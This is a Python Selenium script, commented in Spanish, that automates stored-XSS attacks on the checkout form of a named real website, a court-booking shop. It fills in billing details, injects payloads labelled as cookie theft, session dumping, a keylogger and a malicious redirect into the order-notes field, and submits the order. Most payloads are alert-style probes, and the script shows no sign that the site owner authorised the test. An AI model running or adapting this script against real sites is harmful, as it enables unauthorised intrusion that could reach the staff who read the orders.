from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Payloads XSS avanzados para extraer información
payloads_xss = {
    "Robar cookies": "<script>alert('Cookies: ' + document.cookie)</script>",
    "Obtener URL actual": "<script>alert('URL: ' + window.location.href)</script>",
    "Ver datos de sesión": "<script>alert('SessionStorage: ' + JSON.stringify(sessionStorage))</script>",
    "Obtener HTML de la página": "<script>alert('HTML: ' + document.documentElement.innerHTML.substring(0,200))</script>",
    "Información del navegador": "<script>alert('UserAgent: ' + navigator.userAgent)</script>",
    "Redirección maliciosa": "<script>if(confirm('¿Ir a Google?')) window.location='https://google.com'</script>",
    "Keylogger básico": "<script>document.addEventListener('keypress', function(e) {console.log('Tecla: ' + e.key)})</script>",
    "Extraer formularios": "<script>alert('Formularios: ' + document.forms.length)</script>"
}

def probar_payload(driver, payload_name, payload_code):
    """Prueba un payload XSS específico"""
    try:
        print(f"\n🔍 Probando: {payload_name}")
        print(f"Payload: {payload_code}")
        
        # Ve a la página de finalizar compra
        driver.get("https://www.horcajodesantiago.es/reserva-pistas/carrito/finalizar-compra/")
        
        wait = WebDriverWait(driver, 10)
        wait.until(EC.presence_of_element_located((By.NAME, "order_comments")))
        
        # Rellena solo los campos esenciales
        driver.find_element(By.NAME, "billing_first_name").clear()
        driver.find_element(By.NAME, "billing_first_name").send_keys("Test")
        
        driver.find_element(By.NAME, "billing_last_name").clear()
        driver.find_element(By.NAME, "billing_last_name").send_keys("XSS")
        
        driver.find_element(By.NAME, "billing_phone").clear()
        driver.find_element(By.NAME, "billing_phone").send_keys("123456789")
        
        driver.find_element(By.NAME, "billing_email").clear()
        driver.find_element(By.NAME, "billing_email").send_keys("test@example.com")
        
        # Inyecta el payload en el campo de notas
        campo_notas = driver.find_element(By.NAME, "order_comments")
        campo_notas.clear()
        campo_notas.send_keys(payload_code)
        
        print(f"✓ Payload inyectado en campo 'order_comments'")
        
        input(f"Presiona Enter para ejecutar el payload '{payload_name}'...")
        
        # Marca términos si existe
        try:
            driver.find_element(By.NAME, "terms").click()
        except:
            pass
        
        # Envía el formulario
        try:
            driver.find_element(By.ID, "place_order").click()
            print("✓ Formulario enviado")
            time.sleep(5)
        except:
            print("⚠️ No se pudo enviar automáticamente, hazlo manualmente")
            input("Envía manualmente y presiona Enter...")
        
        print(f"✅ Prueba completada para: {payload_name}")
        return True
        
    except Exception as e:
        print(f"❌ Error en {payload_name}: {e}")
        return False

def main():
    driver = webdriver.Chrome()
    
    print("🚀 PRUEBAS AVANZADAS DE XSS")
    print("="*50)
    print("Asegúrate de tener algo en el carrito primero")
    
    input("Presiona Enter para comenzar las pruebas avanzadas...")
    
    for nombre, payload in payloads_xss.items():
        print(f"\n{'='*60}")
        continuar = input(f"¿Probar '{nombre}'? (s/n): ").lower()
        
        if continuar == 's':
            exito = probar_payload(driver, nombre, payload)
            if exito:
                input("Observa el resultado y presiona Enter para continuar...")
        else:
            print("Saltando...")
    
    print("\n🎯 PRUEBAS COMPLETADAS")
    print("="*50)
    driver.quit()

if __name__ == "__main__":
    main()
